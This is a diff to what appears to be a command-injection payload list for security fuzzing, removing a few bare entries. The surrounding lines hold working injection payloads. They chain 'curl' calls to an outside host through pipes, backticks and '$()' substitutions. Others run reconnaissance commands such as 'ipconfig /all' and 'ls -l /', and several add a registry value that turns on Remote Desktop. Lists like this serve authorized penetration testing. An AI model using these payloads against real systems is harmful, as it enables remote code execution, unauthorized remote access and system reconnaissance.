@@ -27,7 +27,6 @@ curl https://crowdshield.com/.testing/rce_vuln.txt
  curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\" |curl https://crowdshield.com/.testing/rce_vuln.txt
 curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\" |curl https://crowdshield.com/.testing/rce_vuln.txt
 $(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)
-dir
 | dir
 ; dir
 $(`dir`)
@@ -113,7 +112,6 @@ ipconfig
 & ipconfig /all
 && ipconfig /all
 ipconfig /all
-ls
 $(`ls`)
 | ls -l /
 ; ls -l /
@@ -250,7 +248,6 @@ pwd
 ; pwd
 & pwd
 && pwd
-\r
 | reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 ; reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 & reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
